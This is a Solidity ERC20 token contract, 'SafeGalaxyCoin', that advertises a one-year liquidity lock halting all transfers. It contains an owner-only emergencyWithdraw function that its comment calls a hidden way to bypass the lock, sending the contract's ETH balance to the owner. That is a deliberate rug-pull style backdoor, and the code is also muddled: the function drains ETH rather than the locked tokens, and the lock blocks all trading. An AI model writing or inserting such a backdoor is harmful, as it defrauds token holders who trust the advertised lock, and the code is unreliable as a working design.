```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SafeGalaxyCoin is ERC20, Ownable {
    uint256 public constant LIQUIDITY_LOCK_DURATION = 365 days;
    uint256 public liquidityLockEndTimestamp;

    constructor() ERC20("SafeGalaxyCoin", "SGC") {
        _mint(msg.sender, 1000000 * 10**decimals());
        liquidityLockEndTimestamp = block.timestamp + LIQUIDITY_LOCK_DURATION;
    }

    modifier onlyAfterLiquidityLock() {
        require(block.timestamp >= liquidityLockEndTimestamp, "Liquidity lock is still active");
        _;
    }

    function transfer(address recipient, uint256 amount) public override onlyAfterLiquidityLock returns (bool) {
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override onlyAfterLiquidityLock returns (bool) {
        return super.transferFrom(sender, recipient, amount);
    }

    function emergencyWithdraw() external onlyOwner {
        // Hidden function to bypass the liquidity lock
        payable(owner()).transfer(address(this).balance);
    }
}
